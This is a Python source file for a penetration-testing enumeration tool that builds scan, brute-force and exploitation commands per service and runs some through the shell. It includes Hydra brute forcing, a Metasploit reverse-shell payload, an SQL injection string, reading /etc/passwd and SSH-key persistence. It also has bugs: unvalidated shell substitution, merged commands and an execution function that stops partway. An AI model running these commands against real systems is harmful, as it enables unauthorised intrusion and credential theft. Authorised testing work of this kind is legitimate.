#!/usr/bin/env python3
# -*- coding: utf-8 -*-

################################################
# TAPE Installation Script                     #
# TAPE - Tmux Automated Pentesting Enumeration #
# Chronos Security                             #
# https://chronos-security.ro                  #
# https://github.com/Chronos-Security          #
################################################

import os
import sys
import shutil
import requests
import argparse
import subprocess
from collections import defaultdict
from datetime import datetime
from termcolor import cprint, colored
import colorama
from tabulate import tabulate

# -----------------------------
# Configurations and Variables
# -----------------------------

# Integrate Windows terminal coloring
colorama.init()

# Directories
RECON_DIR = "recon"
VULNS_DIR = "vulns"
FILES_DIR = "files"
NOTES_DIR = "notes"

# Create necessary directories and files with proper permissions
directories = [VULNS_DIR, RECON_DIR, FILES_DIR, NOTES_DIR]
files = ["notes.txt", "users.txt", "passwords.txt", "hashes.txt", "creds.txt"]

def create_directories_and_files():
    """Create necessary directories and files."""
    is_windows = os.name == 'nt'

    for directory in directories:
        os.makedirs(directory, exist_ok=True)
        if not is_windows:
            # On Unix-like systems, set ownership
            original_uid = int(os.environ.get('SUDO_UID', os.getuid()))
            original_gid = int(os.environ.get('SUDO_GID', os.getgid()))
            os.chown(directory, original_uid, original_gid)

    for filename in files:
        filepath = os.path.join(NOTES_DIR, filename)
        with open(filepath, 'a'):
            pass  # Create the file if it doesn't exist
        if not is_windows:
            # On Unix-like systems, set ownership
            os.chown(filepath, original_uid, original_gid)


# Commands for each service and action
# Updated to support grouped commands
COMMANDS = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))

# Services and their default ports
SERVICES = {
    "FTP": {"ports": [21], "transport": "TCP"},
    "SSH": {"ports": [22], "transport": "TCP"},
    "TELNET": {"ports": [23], "transport": "TCP"},
    "SMTP": {"ports": [25, 465, 587], "transport": "TCP"},
    "DNS": {"ports": [53], "transport": "TCP/UDP"},
    "TFTP": {"ports": [69], "transport": "UDP"},
    "HTTP": {"ports": [80, 443, 8080, 8000, 8008], "transport": "TCP"},
    "KERBEROS": {"ports": [88], "transport": "TCP/UDP"},
    "POP3": {"ports": [110, 995], "transport": "TCP"},
    "IMAP": {"ports": [143, 993], "transport": "TCP"},
    "LDAP": {"ports": [389, 636, 3268, 3269], "transport": "TCP"},
    "SMB": {"ports": [139, 445], "transport": "TCP"},
    "RDP": {"ports": [3389], "transport": "TCP"},
    "MYSQL": {"ports": [3306], "transport": "TCP"},
    "NFS": {"ports": [2049], "transport": "TCP/UDP"},
    "RPCBIND": {"ports": [111], "transport": "TCP/UDP"},
    "VNC": {"ports": [5900], "transport": "TCP"},
    "POSTGRES": {"ports": [5432], "transport": "TCP"},
    "REDIS": {"ports": [6379], "transport": "TCP"},
    "MONGODB": {"ports": [27017], "transport": "TCP"},
    "WINRM": {"ports": [5985, 5986], "transport": "TCP"},
    # More will be added in the future
}

# -----------------------------
# Function Definitions
# -----------------------------

def update_script():
    cprint("[+] Checking for updates...", "blue")
    github_url = "https://raw.githubusercontent.com/ChronosPK/TAPE/main/tape.py"
    try:
        response = requests.get(github_url, timeout=10)
        if response.status_code == 200:
            script_path = os.path.realpath(__file__)
            backup_path = script_path + ".bak"
            shutil.copy2(script_path, backup_path)
            with open(script_path, 'w', encoding='utf-8') as script_file:
                script_file.write(response.text)
            cprint("[+] TAPE has been updated to the latest version.", "green")
            cprint(f"[i] A backup is saved as {backup_path}.", "yellow")
        else:
            cprint(f"[!] Failed to download the latest version. HTTP Status Code: {response.status_code}", "red")
    except Exception as e:
        cprint(f"[!] An error occurred: {e}", "red")

parser = argparse.ArgumentParser(
    description="TAPE - Tmux Automated Pentesting Enumeration",
    formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=35)
)

parser.add_argument('-e', '--env', action='store_true', help='Create the environment with appropriate files and directories')
parser.add_argument('-l', '--list-commands', action='store_true', help='List all available commands')
parser.add_argument('-ls', '--list-services', action='store_true', help='List all available services with their default ports and transport protocols')
parser.add_argument('-s', '--service', help='Specify a service to list commands for')
parser.add_argument('-i', '--ip', help='Set target IP address')
parser.add_argument('-d', '--domain', metavar='DOMAIN', help='Set target domain')
parser.add_argument('-n', '--net', help='Set target network (e.g., 192.168.1.0/24)')
parser.add_argument('-q', '--quiet', action='store_true', help='Suppress command output (commands are echoed by default)')
parser.add_argument('-x', '--execute', action='store_true', help='Execute the enumeration process')
parser.add_argument('-f', '--force-recon', action='store_true', help='Force reconnaissance scans even if already done')
parser.add_argument('-u', '--update', action='store_true', help='Update TAPE to the latest version')
args = parser.parse_args()

def display_help():
    parser.print_help()

def is_root():
    return os.geteuid() == 0

import shutil

def resolve_domain(domain):
    """Resolve a domain to an IP address using the 'dig' command."""
    if not shutil.which("dig"):
        raise EnvironmentError("The 'dig' command is not available. Please install it or use an alternative method.")
    
    try:
        result = subprocess.check_output(['dig', '+short', domain], text=True)
        ip = result.strip().split('\n')[0]
        if ip:
            return ip
        else:
            return None
    except subprocess.CalledProcessError as e:
        cprint(f"[!] Error resolving domain {domain}: {e}", "red")
        return None


def format_command(command, variables):
    # Replace placeholders without braces
    for key, value in variables.items():
        command = command.replace(key, value)
    return command

def list_services():
    """Lists all services with their default ports and transport protocols in a tabular format."""
    cprint("[+] Available Services:\n", "green")
    services_data = []
    for service, details in SERVICES.items():
        ports = ', '.join(map(str, details["ports"]))
        transport = details["transport"]
        services_data.append([service, ports, transport])

    table = tabulate(services_data, headers=["Service", "Ports", "Transport"], tablefmt="github")
    print(table)

def list_commands(commands, variables, service=None):
    services_to_list = [service.upper()] if service else sorted(
        commands.keys(), key=lambda x: SERVICES.get(x, {}).get('ports', [0])[0]
    )
    for protocol in services_to_list:
        if protocol not in commands:
            continue
        actions = commands[protocol]
        ports = ','.join(map(str, SERVICES.get(protocol, {}).get('ports', ['N/A'])))
        transport = SERVICES.get(protocol, {}).get('transport', 'N/A')
        for action in actions:
            for subaction in actions[action]:
                action_subaction_title = f"{protocol} - {ports}/{transport} - {action} - {subaction}"
                cprint(action_subaction_title, "black", "on_light_cyan", attrs=["bold"])
                for cmd_group in actions[action][subaction]:
                    description = cmd_group.get('description', None)
                    cmds = cmd_group.get('commands', [])
                    if description:
                        cprint(f"# {description}", "cyan")
                    for cmd in cmds:
                        cmd_display = format_command(cmd, variables)
                        cprint(cmd_display, "light_grey")
                    print()


def main():
    if len(sys.argv) == 1:
        display_help()
        sys.exit(1)

    variables = {
        'IP': args.ip if args.ip else 'IP',
        'NET': args.net if args.net else 'NET',
        'DOMAIN': args.domain if args.domain else 'DOMAIN',
        'RECON_DIR': RECON_DIR,
        'USER': 'USER',
        'PASS': 'PASS',
    }

    if args.list_services:
        list_services()
        sys.exit(0)
    
    if args.env:
        create_directories_and_files()
        cprint("[+] Directories and files have been created.", "green")
        sys.exit(0)

    # If both IP and domain are provided
    if args.ip and args.domain:
        resolved_ip = resolve_domain(args.domain)
        if resolved_ip:
            if resolved_ip != args.ip:
                cprint(f"[!] Error: Domain {args.domain} does not resolve to IP {args.ip}.", "red")
                sys.exit(1)
            else:
                variables['IP'] = args.ip
                variables['DOMAIN'] = args.domain
        else:
            cprint(f"[!] Error: Unable to resolve domain {args.domain}.", "red")
            sys.exit(1)

    if args.domain:
        try:
            resolved_ip = resolve_domain(args.domain)
            if resolved_ip:
                cprint(f"[+] Domain {args.domain} resolved to {resolved_ip}.", "green")
            else:
                cprint(f"[!] Could not resolve domain {args.domain}.", "red")
        except EnvironmentError as e:
            cprint(f"[!] {e}", "red")
            sys.exit(1)

    elif args.ip:
        # Only IP is provided
        variables['IP'] = args.ip
        variables['DOMAIN'] = 'DOMAIN'
    else:
        # Neither IP nor domain is provided
        variables['IP'] = 'IP'
        variables['DOMAIN'] = 'DOMAIN'

    if args.update:
        update_script()
        sys.exit(0)

    # Prioritize domain over IP in URL
    variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"

    # Create commands for recon and for each service
    COMMANDS['RECON']['Network'][''] = [
        {
            'description': "netdiscover",
            'commands': [
                r"""sudo netdiscover -i eth0 -r NET"""
            ]
        },
        {
            'description': "nmap",
            'commands': [
                r"""nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init""",
                r"""cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
                r"""sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"""
            ]
        },
        {
            'description': "fping + nmap",
            'commands': [
                r"""fping -a -g NET 2>/dev/null > recon/hosts""",
                r"""nmap -sC -sV -v -A -T4 -Pn -iL recon/hosts -n -p- -oN recon/nmap.network --open --max-retries 5"""
            ]
        },
        {
            'description': "masscan",
            'commands': [
                r"""masscan NET –echo > recon/masscan.conf"""
            ]
        },
        {
            'description': "UDP with nmap",
            'commands': [
                r"""nmap -sU -sV --version-intensity 0 -F -n NET -oN recon/nmap.udp-net""",
                r"udp-proto-scanner.pl NET"
            ]
        },
        {
            'description': "No man's land",
            'commands': [
                r"""for i in {1..254} ;do (ping -c 1 10.10.10.$i | grep 'bytes from' | awk '{print $4}' | cut -d ':' -f 1 &) ;done"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['RECON']['Single Host']['nmap'] = [
        {
            "description": "Extract ports and run all-TCP scan",
            "commands": [
                r"""nmap -Pn -p- -v -T4 --max-retries 5 IP -oN recon/nmap.init""",
                r"""cat recon/nmap.init | grep -E "^[0-9]+/tcp.*(open|filtered|closed)" | awk '{print $1}' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//g' > recon/ports""",
                r"""sudo nmap -Pn -sS -sV -n -v -A -T4 -p $(cat recon/ports) IP -oN recon/nmap.alltcp"""
            ]
        },
        {
            "description": "Perform OS detection with Nmap",
            "commands": [
                r"""sudo nmap -O -Pn -p- -T4 --max-retries 4 -v IP -oN recon/nmap.os"""
            ]
        },
        {
            "description": "Vulnerability scan with Nmap",
            "commands": [
                r"""nmap --script vulners -Pn -sC -sV -v -A -T4 -p- --max-retries 5 --open IP -oN recon/nmap.vuln"""
            ]
        },
        {
            "description": "Run UDP scan with Nmap",
            "commands": [
                r"""nmap -sU -sV -sC -n -F -T4 IP -oN recon/nmap.udp"""
            ]
        },
        {
            'description': "Firewall evasion",
            'commands': [
                r"""sudo nmap -v -Pn -sS -sV -T4 --max-retries 3 --min-rate 450 --max-rtt-timeout 500ms --min-rtt-timeout 50ms -p- -f --source-port 53 --spoof-mac aa:bb:cc:dd:ee:ff IP"""
        ]
        }
    ]
    COMMANDS['RECON']['Single Host']['rustscan'] = [
        {
            "description": "Fast rustscan analysis",
            "commands": [
                r"""rustscan -a IP --ulimit 5000 -- -sC -sV -v -oN recon/rustscan.init"""
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['autorecon'] = [
        {
            "description": "Enumeration with autorecon",
            "commands": [
                r"""autorecon -v --heartbeat 10 IP"""
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['legion'] = [
        {
            "description": "Recon with legion - GUI application",
            "commands": [
                r"""sudo legion"""
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['zenmap'] = [
        {
            "description": "Recon with zenmap - GUI application",
            "commands": [
                r"""zenmap"""
            ]
        },
    ]
    COMMANDS['RECON']['Single Host']['No man\'s land'] = [
        {
            "description": "Utilizing /dev/tcp/ip/port to test connection",
            "commands": [
                r"""for port in {1..65535}; do echo 2>/dev/null > /dev/tcp/IP/$port && echo -e "$port open\n"; done"""
            ]
        },
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['FTP']['Enumeration']['Anonymous Access'] = [
        {
            'description': "Check for anonymous FTP login with Nmap",
            'commands': [
                r"""nmap -p PORT --script ftp-anon IP -oN recon/ftp_anonymous.txt"""
            ]
        },
        {
            'description': "Check for anonymous FTP login with FTP client",
            'commands': [
                r"""ftp -nv IP PORT"""
            ]
        }
    ]
    COMMANDS['FTP']['Enumeration']['Banner Grabbing'] = [
        {
            'description': "FTP Banner Grabbing with Nmap",
            'commands': [
                r"""nmap -sV -p PORT IP -oN recon/ftp_banner.txt"""
            ]
        },
        {
            'description': "FTP Banner Grabbing with Netcat",
            'commands': [
                r"""nc -nv IP PORT"""
            ]
        }
    ]
    COMMANDS['FTP']['Enumeration']['Brute Force'] = [
        {
            'description': "FTP Brute Force with Hydra",
            'commands': [
                r"""hydra -L users.txt -P passwords.txt ftp://IP -s PORT"""
            ]
        },
        {
            'description': "FTP User Enumeration with ftp-user-enum",
            'commands': [
                r"""ftp-user-enum.pl -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t IP"""
            ]
        }
    ]
    COMMANDS['FTP']['Access']['Read Permissions'] = [
        {
            'description': "List files and directories",
            'commands': [
                r"""ls -lsa"""
            ]
        },
        {
            'description': "Download a specific file",
            'commands': [
                r"""get FILENAME"""
            ]
        },
        {
            'description': "Download all files",
            'commands': [
                r"""prompt; mget *"""
            ]
        },
        {
            'description': "Recursive download using wget",
            'commands': [
                r"""wget -r ftp://USER:PASS@IP/"""
            ]
        },
        {
            'description': "Enter passive FTP session",
            'commands': [
                r"""quote PASV"""
            ]
        }
    ]
    COMMANDS['FTP']['Access']['Write Permissions'] = [
        {
            'description': "Upload binary files",
            'commands': [
                r"""binary; put BINARY_FILE"""
            ]
        },
        {
            'description': "Upload ASCII files",
            'commands': [
                r"""ascii; put ASCII_FILE"""
            ]
        }
    ]
    COMMANDS['FTP']['Access']['Mount Folders'] = [
        {
            'description': "Mount FTP folder using curlftpfs",
            'commands': [
                r"""mkdir /mnt/ftp""",
                r"""curlftpfs IP /mnt/ftp/ -o user=USER:PASS"""
            ]
        },
        {
            'description': "Unmount FTP folder",
            'commands': [
                r"""fusermount -u /mnt/ftp"""
            ]
        }
    ]
    COMMANDS['FTP']['Access']['mod_copy RCE in vsftpd 1.3.5 '] = [
        {
            'description': "Exploit manually",
            'commands': [
                r"""nc -v IP 21""",
                r"""site cpfr LOCAL_FILE""",
                r"""site cpto FTP_DIRECTORY"""
            ]
        },
        {
            'description': "Exploit with metasploit",
            'commands': [
                r"""sudo msfdb start""",
                r"""msfconsole -q """,
                r"""use /exploit/unix/ftp/proftpd_modcopy_exec""",
                r"""set rhosts IP""",
                r"""set lhost tun0""",
                r"""set sitepath /var/www/something""",
                r"""set payload cmd/unix/reverse_python"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['SSH']['Enumeration']['Banner Grabbing'] = [
        {
            'description': "SSH Banner Grabbing with Nmap",
            'commands': [
                r"""nmap -p22 IP -sV"""
            ]
        },
        {
            'description': "SSH Keyscan",
            'commands': [
                r"""ssh-keyscan -t rsa IP -p 22"""
            ]
        }
    ]
    COMMANDS['SSH']['Enumeration']['Algorithm Enumeration'] = [
        {
            'description': "List supported algorithms",
            'commands': [
                r"""nmap -p22 IP --script ssh2-enum-algos -oN recon/ssh-alg"""
            ]
        }
    ]
    COMMANDS['SSH']['Brute Force']['Hydra'] = [
        {
            'description': "Brute force SSH with Hydra",
            'commands': [
                r"""hydra -l USER -P notes/passwords.txt ssh://IP -s 22"""
            ]
        }
    ]
    COMMANDS['SSH']['Access'][''] = [
        {
            'description': "Execute a command right after login",
            'commands': [
                r"""ssh -v USER@IP id;cat /etc/passwd"""
            ]
        }
    ]
    COMMANDS['SSH']['Access']['ID_RSA key'] = [
        {
            'description': "Simple login",
            'commands': [
                r"""chmod 600 id_rsa""",
                r"""ssh -i id_rsa USER@IP"""
            ]
        },
        {
            'description': "Passphrase protected",
            'commands': [
                r"""ssh2john id_rsa > notes/hashes-ssh.txt"""
                r"""john notes/hashes-ssh.txt --wordlist=/usr/share/wordlists/rockyou.txt"""
            ]
        }
    ]
    COMMANDS['SSH']['Access']['Tunnel'] = [
        {
            'description': "Local Tunnel",
            'commands': [
                r"""ssh -L local_ip:local_port:destination_ip:destination_port user@IP"""
            ]
        },
        {
            'description': "Remote Tunnel",
            'commands': [
                r"""ssh -R remote_ip:remote_port:destination_ip:destination_port user@IP"""
            ]
        },
        {
            'description': "Additional arguments",
            'commands': [
                r"""-N don't execute commands"""
                r"""-f run in background"""
            ]
        }
    ]
    COMMANDS['SSH']['Access']['Persistence'] = [
        {
            'description': "Generate SSH keys",
            'commands': [
                r"""ssh-keygen"""
                r"""scp ~/.ssh/id_rsa.pub USER@IP:/home/USER/.ssh/authorized_keys"""
            ]
        }
    ]
    COMMANDS['SSH']['Other']['Port Knock'] = [
        {
            'description': "Check config file",
            'commands': [
                r"""sudo nano /etc/knockd.conf"""
                r"""sudo vim /etc/default/knockd"""
            ]
        },
        {
            'description': "Knock on the found ports to open SSH",
            'commands': [
                r"""knock -v IP port1 port2 port3"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['TELNET']['Enumeration']['nmap'] = [
        {
            'description': "",
            'commands': [
                r"""nmap -n -sV -Pn --script "*telnet* and safe" -p PORT IP -oN recon/nmap.telnet"""
            ]
        }
    ]
    COMMANDS['TELNET']['Bruteforce']['hydra'] = [
        {
            'description': "",
            'commands': [
                r"""hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt IP telnet"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['SMTP']['Enumeration']['VRFY Command'] = [
        {
            'description': "Check for valid users with VRFY",
            'commands': [
                r"""nc IP 25""",
                r"""VRFY root""",
                r"""VRFY user"""
            ]
        },
        {
            'description': "Possible responses",
            'commands': [
                r"""252 2.0.0 root"""
                r"""550 5.1.1 user: ... User unknown in local recipient table"""
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Users Enumeration'] = [
        {
            'description': "With smtp-user-enum",
            'commands': [
                r"""smtp-user-enum -M VRFY -U users.txt -t IP"""
            ]
        },
        {
            'description': "With nmap",
            'commands': [
                r"""nmap --script smtp-enum-users IP -oN recon/nmap.smtp-users"""
            ]
        },
        {
            'description': "With metasploit",
            'commands': [
                r"""msfconsole -q -e "use auxiliary/scanner/smtp/smtp_enum" """
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Allowed Commands'] = [
        {
            'description': "Use nmap to find allowed commands",
            'commands': [
                r"""nmap -p PORT --script smtp-commands IP -oN recon/nmap.smtp-comm"""
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Check NTLM Authentication'] = [
        {
            'description': "Use nmap",
            'commands': [
                r"""nmap -sS -v --script=*-ntlm-info --script-timeout=60s DOMAIN -oN recon/nmap.smtp-ntlm"""
            ]
        },
        {
            'description': "Check for NTLM challenge response for information disclosure",
            'commands': [
                r"""telnet DOMAIN PORT""",
                r"""HELO""",
                r"""NTLM AUTH""",
                r"""TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="""
            ]
        }
    ]
    COMMANDS['SMTP']['Enumeration']['Find MX servers'] = [
        {
            'description': "Enumerate with dig",
            'commands': [
                r"""dig +short mx DOMAIN"""
            ]
        }
    ]
    COMMANDS['SMTP']['Access']['Enumeration'] = [
        {
            'description': "Things to try while on the server",
            'commands': [
                r"""- look for info about the network topology""",
                r"""- view headers for relevant information"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['WHOIS']['Enumeration']['Find the domain'] = [
        {
            'description': "Enumeration",
            'commands': [
                r"""whois -h IP -p PORT "DOMAIN" """,
                r"""echo "DOMAIN" | nc -vn IP PORT """
            ]
        }
    ]
    COMMANDS['WHOIS']['Exploitation']['SQL injection'] = [
        {
            'description': "Payload",
            'commands': [
                r"""whois -h IP -p PORT "a') or 1=1# """
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['DNS']['Enumeration']['Automated'] = [
        {
            'description': "Automated enumeration",
            'commands': [
                r"""nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" IP -oN recon/nmap.dns""",
                r"""dnscan.py -d DOMAIN -r -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"""
            ]
        }
    ]
    COMMANDS['WHOIS']['Enumeration']['View Records'] = [
        {
            'description': "All records",
            'commands': [
                r"""dig DOMAIN ALL"""
            ]
        },
        {
            'description': "A records",
            'commands': [
                r"""dig DOMAIN +short"""
            ]
        },
        {
            'description': "Mail server",
            'commands': [
                r"""dig DOMAIN -t mx +short"""
            ]
        },
        {
            'description': "NS, CNAME records",
            'commands': [
                r"""dig DOMAIN -t ns +short"""
            ]
        },
        {
            'description': "ZONE transfer",
            'commands': [
                r"""dig axfr DOMAIN ns08.DOMAIN""",
                r"""dig axfr IP DOMAIN""",
                r"""dig @IP DOMAIN -t AXFR +nocookie""",
                r"""host -t axfr DOMAIN IP""",
                r"""dnsrecon -d DOMAIN -t axfr"""
            ]
        },
        {
            'description': "Specify a DNS server",
            'commands': [
                r"""dig @IP DOMAIN"""
            ]
        }
    ]
    COMMANDS['DNS']['Bruteforce']['Subdomains'] = [
        {
            'description': "Bruteforce subdomains",
            'commands': [
                r"""wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "DOMAIN" -H "Host: FUZZ.DOMAIN" --hl 7 -f recon/subdomains.txt""",
                r"""gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u DOMAIN""",
                r"""nmap -T4 -p PORT --script dns-brute DOMAIN""",
                r"""dnsrecon -d DOMAIN -D /usr/share/wordlists/dnsmap.txt -t std --xml recon/dnsrecon.xml""",
                r"""puredns bruteforce all.txt $domain"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['TFTP']['Enumeration']['Nmap'] = [
        {
            'description': "Enumerate with nmap",
            'commands': [
                r"""nmap -n -Pn -sUV -pPORT --script tftp-enum IP -oN recon/nmap.tftp"""
            ]
        }
    ]
    COMMANDS['TFTP']['Enumeration']['Metasploit'] = [
        {
            'description': "See upload/download capabilities",
            'commands': [
                r"""msfconsole -q -e "use auxiliary/admin/tftp/tftp_transfer_util"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['SMB']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "Run SMB NSE Scripts",
            'commands': [
                r"""nmap --script "safe or smb-enum-*" -p 139,445 IP -oN recon/nmap.smb"""
            ]
        }
    ]
    COMMANDS['SMB']['Enumeration']['Enum4Linux'] = [
        {
            'description': "Enumerate SMB with Enum4Linux",
            'commands': [
                r"""enum4linux -avA IP > recon/enum4linux.out"""
            ]
        }
    ]
    COMMANDS['SMB']['Brute Force']['Hydra'] = [
        {
            'description': "Brute force SMB with Hydra",
            'commands': [
                r"""hydra -L users.txt -P passwords.txt IP smb"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['NFS']['Enumeration']['Showmount'] = [
        {
            'description': "List NFS shares",
            'commands': [
                r"""showmount -e IP"""
            ]
        }
    ]
    COMMANDS['NFS']['Access']['Mount Share'] = [
        {
            'description': "Mount NFS share",
            'commands': [
                r"""mkdir /mnt/nfs""",
                r"""mount -t nfs IP:/share /mnt/nfs"""
            ]
        }
    ]
    COMMANDS['NFS']['Access']['Unmount Share'] = [
        {
            'description': "Unmount NFS share",
            'commands': [
                r"""umount /mnt/nfs"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['LDAP']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "Enumerate LDAP with Nmap",
            'commands': [
                r"""nmap -n -sV --script "ldap* and not brute" IP -oN recon/nmap.ldap"""
            ]
        }
    ]
    COMMANDS['LDAP']['Enumeration']['ldapsearch'] = [
        {
            'description': "Anonymous LDAP search",
            'commands': [
                r"""ldapsearch -x -H ldap://IP -b "DC=DOMAIN,DC=COM"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['RDP']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "Check RDP security",
            'commands': [
                r"""nmap -sV -Pn -p 3389 --script rdpscreenshot.nse IP -oN recon/nmap.rdp"""
            ]
        }
    ]
    COMMANDS['RDP']['Brute Force']['Hydra'] = [
        {
            'description': "Brute force RDP with Hydra",
            'commands': [
                r"""hydra -L users.txt -P passwords.txt rdp://IP"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------
    COMMANDS['MYSQL']['Enumeration']['Nmap Scripts'] = [
        {
            'description': "MySQL Enumeration with Nmap",
            'commands': [
                r"""nmap -sV -Pn -T4 -vv --script=mysql* IP -p 3306 -oN recon/nmap.mysql"""
            ]
        }
    ]
    COMMANDS['MYSQL']['Access']['Login'] = [
        {
            'description': "Login to MySQL",
            'commands': [
                r"""mysql -u root -p -h IP"""
            ]
        }
    ]

#------------------------------------------------------------------------------------------------------------------


    # List Commands
    if args.list_commands:
        variables['PORT'] = 'PORT'
        list_commands(COMMANDS, variables, args.service)
        sys.exit(0)

    if not args.execute:
        variables['PORT'] = 'PORT'
        list_commands(COMMANDS, variables, args.service)
        sys.exit(0)

    if not is_root():
        cprint(f"[!] Please run as root.", "red")
        sys.exit(1)

    # Proceed with execution
    # Check if recon has been done
    recon_done = os.path.exists('recon/nmap.init')
    if recon_done and not args.force_recon:
        cprint(f"[*] Reconnaissance scans already completed.", "green")
        cprint(f"[*] Use --force-recon to run reconnaissance scans again.", "yellow")
    else:
        cprint(f"[*] Running reconnaissance scans...", "green")
        variables['PORT'] = ''
        # Execute the first RECON command group
        recon_commands = COMMANDS['RECON']['Single Host']['nmap'][0]['commands']
        desc = COMMANDS['RECON']['Single Host']['nmap'][0]['description']
        if not args.quiet:
            cprint("RECON", "red")
            cprint(" - ")
            cprint(desc, "cyan")
        for cmd in recon_commands:
            cmd_exec = format_command(cmd, variables)
            if not args.quiet:
                cmd_display = cmd_exec
                cprint(f"$ {cmd_display}", "light_yellow")
            subprocess.call(cmd_exec, shell=True)

    # Continue with parsing open ports
    if os.path.exists('recon/nmap.init'):
        cprint(f"[*] Extracting open ports...", "green")
        open_ports = []
        with open('recon/nmap.init', 'r') as f:
            for line in f:
                if '/tcp' in line and 'open' in line:
                    port = line.split('/')[0].strip()
                    open_ports.append(port)
        if not open_ports:
            cprint(f"[!] No open ports found on {variables['IP']}.", "red")
            sys.exit(1)
        variables['OPEN_PORTS'] = ','.join(open_ports)
        cprint("[*] Open ports: ", "green", end="") 
        cprint(variables['OPEN_PORTS'], "yellow")
    else:
        cprint("[!] Reconnaissance scans did not produce expected output.", "red")
        sys.exit(1)

    # Parse services from detailed Nmap output
    cprint("[*] Parsing services from Nmap output...", "green")
    discovered_services = defaultdict(list)
    if os.path.exists('recon/nmap.alltcp'):
        with open('recon/nmap.alltcp', 'r') as f:
            for line in f:
                if '/tcp' in line and 'open' in line:
                    parts = line.split()
                    port = parts[0].split('/')[0]
                    if len(parts) >= 3:
                        service = parts[2].upper()
                    else:
                        service = 'UNKNOWN'
                    discovered_services[service].append(port)
    else:
        cprint("[!] Detailed Nmap scan output not found.", "yellow")
        sys.exit(1)
    if not discovered_services:
        cprint(f"[!] No services found.", "red")
        sys.exit(1)

    # Filter commands based on discovered services
    commands_to_execute = defaultdict(lambda: defaultdict(lambda: defaultdict(list)))
    for service in discovered_services:
        if service in COMMANDS:
            for action in COMMANDS[service]:
                for subaction in COMMANDS[service][action]:
                    for cmd_group in COMMANDS[service][action][subaction]:
                        commands_to_execute[service][action][subaction].append(cmd_group)
        else:
            cprint(f"[!] No commands found for service: {service}", "yellow")

    # Update variables with URL
    variables['URL'] = f"http://{variables['DOMAIN'] if variables['DOMAIN'] != 'DOMAIN' else variables['IP']}"

    # Show commands unless quiet
    if not args.quiet:
        list_commands(commands_to_execute, variables)

    # Execute commands if -x is specified
    if args.execute:
        cprint(f"[*] Executing service enumeration commands in tmux...", "green")
        execute_commands_with_tmux(commands_to_execute, variables, discovered_services)

def execute_commands_with_tmux(commands, variables, discovered_services):
    # Check if tmux is installed
    if subprocess.call(['which', 'tmux'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        cprint(f"[!] tmux is not installed. Please install tmux.", "red")
        sys.exit(1)

    session_name = f"TAPE_{int(datetime.now().timestamp())}"
    # Start tmux session
    subprocess.call(['tmux', 'new-session', '-d', '-s', session_name])

    window_index = 1
    for protocol in commands:
        if protocol not in discovered_services and protocol != 'RECON':
            continue  # Skip if protocol not in discovered services, except for RECON

        variables['PORT'] = ','.join(discovered_services.get(protocol, []))
        if protocol in SERVICES:
            ports = ','.join(discovered_services.get(protocol, SERVICES[protocol]['ports']))
            transport = SERVICES[protocol]['transport']
        else:
            ports = 'N/A'
            transport = 'N/A'
        for action in commands[protocol]:
            for subaction in commands[protocol][action]:
                # Create window name
                window_name = f"{protocol}_{action}_{subaction}"
                # Replace spaces with underscores and limit length
                window_name = window_name.replace(' ', '_')[:50]
                # Create a new window for each protocol-action-subaction
                subprocess.call(['tmux', 'new-window', '-t', session_name, '-n', window_name])
                protocol_title = colored(f"{protocol} - {ports}/{transport}", "green")
                tmux_cmd = f"echo -e '{protocol_title}'"
                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                action_subaction_title = colored(f"{protocol} - {ports}/{transport} - {action} - {subaction}", "cyan")
                tmux_cmd = f"echo -e '{action_subaction_title}'"
                subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
                for cmd_group in commands[protocol][action][subaction]:
                    description = colored(cmd_group['description'], "yellow")
                    cmds = cmd_group['commands']
                    if description:
                        tmux_cmd = f"echo -e '# {description}'"
                        subprocess.call(['tmux', 'send-keys', '-t', f"{session_name}:{window_name}", tmux_cmd, 'C-m'])
